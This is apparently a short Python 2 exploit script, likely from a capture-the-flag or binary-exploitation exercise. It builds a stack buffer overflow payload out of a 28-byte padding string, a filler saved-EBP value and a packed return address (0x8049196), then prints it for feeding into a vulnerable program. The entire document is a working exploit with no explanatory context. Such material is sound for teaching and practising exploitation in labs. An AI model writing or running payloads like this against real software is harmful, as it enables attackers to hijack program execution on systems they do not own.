import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
ebp = "AAAA"
eip = struct.pack("I", 0x8049196)

print padding + ebp + eip
